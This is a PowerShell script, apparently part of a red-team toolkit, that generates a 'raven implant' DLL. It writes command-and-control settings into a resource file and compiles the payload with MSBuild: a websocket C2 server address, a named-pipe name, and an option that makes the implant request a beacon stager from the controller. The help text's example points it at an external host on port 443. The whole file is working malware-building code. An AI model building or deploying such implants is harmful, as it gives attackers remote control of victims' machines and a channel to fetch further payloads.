function New-RavenPayload {
    <#
    .SYNOPSIS
    This function is used to generate a .resx file for the clients configuration and then use MSBuild to generate a dll

    .DESCRIPTION
    This function will create a .resx file with configuration options for the raven implant. The options are written to the resx file as a 
    serialized custom .net object. During the build process, the resx file will be added as an embedded resource.After the build is complete, the payload
    dll will be written to the output directory.

    .PARAMETER PipePrefix
    Prefix that will be used in the pipename prefix_(alphanumeric string). Required

    .PARAMETER Block
    Block time used by the external C2 server to wait for tasks in milliseconds.

    .PARAMETER Server
    Host name or IP Address and Port for the server. Format = HOST:PORT
    
    .PARAMETER ProjectRoot
    Root project directory for the netRaven client

    .PARAMETER Ssl
    SWITCH. Use Ssl for websocket connections

    .PARAMETER x64
    SWITCH. Generate an x64 payload

    .PARAMETER ToolsVersion
    Version of MSBuild tools to use. Found in the registry: HKLM:\SOFTWARE\Microsoft\MSBuild\ToolsVersions\[Version]

    .PARAMETER OutputPath
    Path to where the compiled payload should be saved.

    .PARAMETER AutoUpgrade
    SWITCH. Configures the raven client so that it will automatically send a request for a beacon stager to the controller.

    .EXAMPLE
    Create a new raven payload that will auto upgrade to beacon upon execution.

    New-RavenPayload -PipePrefix "TermSrv" -Block 5000 -Server "quicksocket.com:443" -ProjectRoot "C:\Users\user\Projects\raven\client\netRaven" -Ssl -AutoUpgrade
    #>
    [CmdletBinding()]
    param
    (
        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string]$PipePrefix,

        [Parameter(Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [int]$Block = 100,

        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string]$Server,

        [Parameter(Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({Test-Path $_})]
        [string]$ProjectRoot = ".",

        [Parameter(Mandatory = $false)]
        [switch]$Ssl,

        [Parameter(Mandatory = $false)]
        [switch]$x64,

        [Parameter(Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [string]$ToolsVersion = "14.0",

        [Parameter(Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [string]$OutputPath = "$($pwd.Path)\$Server`_raven.dll",

        [Parameter(Mandatory = $false)]
        [switch]$AutoUpgrade
    )

    # Add the System.Windows.Forms assembly

    Add-Type -AssemblyName System.Windows.Forms

    # Check to make sure the resource file is present
    if (-not (Test-Path (Resolve-Path $ProjectRoot))) {
        Write-Error "[!] Unable to find $ProjectRoot"
        break
    }

    $SlnFilePath = "$ProjectRoot\netRaven.sln"

    if ($x64) {
        $platform = "x64"
        $dllPath = "$ProjectRoot\x64\Release\Raven.dll"
    }
    else {
        $platform = "x86"
        $dllPath = "$ProjectRoot\Release\Raven.dll"
    }


    Write-Verbose "[+] Configuring an $platform dll"

    $resourcePath = "$(Resolve-Path $ProjectRoot)\netRaven\Properties\Resources.resx"
    # Set the server url
    if ($PSBoundParameters['Ssl'] -eq $true) {
        $ravenserver = "wss://$Server/ws"
    }
    else {
        $ravenserver = "ws://$Server/ws"
    }

    if ($PSBoundParameters['AutoUpgrade'] -eq $true) {
        $auto = $true
    }
    else {
        $auto = $false
    }

    # Create the pipename
    $pipename = "$($PipePrefix)_$(Get-RandomString -length 4)"

    try {
        $ResourceFile = New-Object -TypeName "System.Resources.ResXResourceWriter" -ArgumentList @($resourcePath)
    }
    catch {
        Write-Error $_
        break
    }

    Write-Verbose "[+] Writing configuration options to $resourcePath"
    $ResourceFile.AddResource("server", $ravenserver)
    $ResourceFile.AddResource("pipename", $pipename)
    $ResourceFile.AddResource("block", $Block)
    $ResourceFile.AddResource("auto", $auto)
    $ResourceFile.Generate()
    $ResourceFile.Close()

     # Build the project using MSBuild.exe

    $out = [ordered] @{
        pipename = $pipename
        block = $block
        path = ""
        AutoUpgrade = $auto
        Server = $Server
    }

    if (-not $(Test-Path -Path "HKLM:\SOFTWARE\Microsoft\MSBuild\ToolsVersions\$ToolsVersion")) {
        Write-Verbose "[-] Unable to locate MSBuild tools path"
        break
    }

    $MSBuildBinDir = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\MSBuild\ToolsVersions\$ToolsVersion" -Name "MSBuildToolsPath").MSBuildToolsPath

    $MSBuild = "$MSBuildBinDir`MSBuild.exe"
    $BuildArgs = @{
        FilePath = $MSBuild
        ArgumentList = $SlnFilePath, "/p:Configuration=`"Release`"", "/p:Platform=`"$platform`"", "/p:PlatformToolset=v140", "/clp:ErrorsOnly", "/verbosity:quiet"
        Wait = $true
        NoNewWindow = $true
    }

    Write-Verbose "[+] Initiating MSBuild process.."
    Start-Process @BuildArgs

    # Copy the somberfire dll to the output dir
    Write-Verbose "[+] Copying the compiled dll to $OutputPath"

    Copy-Item -Path $dllPath -Destination $OutputPath -Force
    $out.path = $OutputPath
    

    $out
}

Function Get-RandomString {

	[CmdletBinding()]
	Param (
        [int] $length = 8
	)

	Begin{
	}

	Process{
        Write-Output ( -join ((0x30..0x39) + ( 0x41..0x5A) + ( 0x61..0x7A) | Get-Random -Count $length  | % {[char]$_}) )
	}
}